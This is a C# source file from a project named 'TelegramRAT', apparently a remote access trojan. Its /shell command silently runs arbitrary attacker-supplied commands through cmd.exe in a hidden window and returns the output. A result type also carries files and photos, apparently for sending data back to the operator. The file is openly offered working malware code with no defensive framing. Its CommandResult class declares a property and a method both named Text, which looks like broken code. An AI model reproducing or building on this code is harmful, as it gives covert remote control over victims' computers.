namespace TelegramRAT.Commands;

using System.Diagnostics;
using System.Text;
using TelegramRAT.Models;

internal sealed class ShellExecute : IAsyncCommand
{
    public async Task<CommandResult> ExecuteAsync(string[] args)
    {
        if (args.Length == 0)
            return CommandResult.Text("Usage: /shell <command>");

        var command = string.Join(" ", args);
        var output = await RunProcessAsync("cmd.exe", $"/c {command}");
        return CommandResult.Text(output);
    }

    private static async Task<string> RunProcessAsync(string fileName, string arguments)
    {
        var output = new StringBuilder();
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.OutputDataReceived += (_, e) => { if (e.Data != null) output.AppendLine(e.Data); };
        process.ErrorDataReceived += (_, e) => { if (e.Data != null) output.AppendLine(e.Data); };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();

        await process.WaitForExitAsync();
        return output.Length > 0 ? output.ToString() : "(no output)";
    }
}

internal interface IAsyncCommand
{
    Task<CommandResult> ExecuteAsync(string[] args);
}

internal sealed class CommandResult
{
    public string? Text { get; init; }
    public string? FilePath { get; init; }
    public byte[]? PhotoData { get; init; }
    public string? Caption { get; init; }

    public static CommandResult FromText(string text) => new() { Text = text };
    public static CommandResult Text(string text) => new() { Text = text };
    public static CommandResult File(string path) => new() { FilePath = path };
    public static CommandResult Photo(byte[] data, string? caption = null) => new() { PhotoData = data, Caption = caption };
}
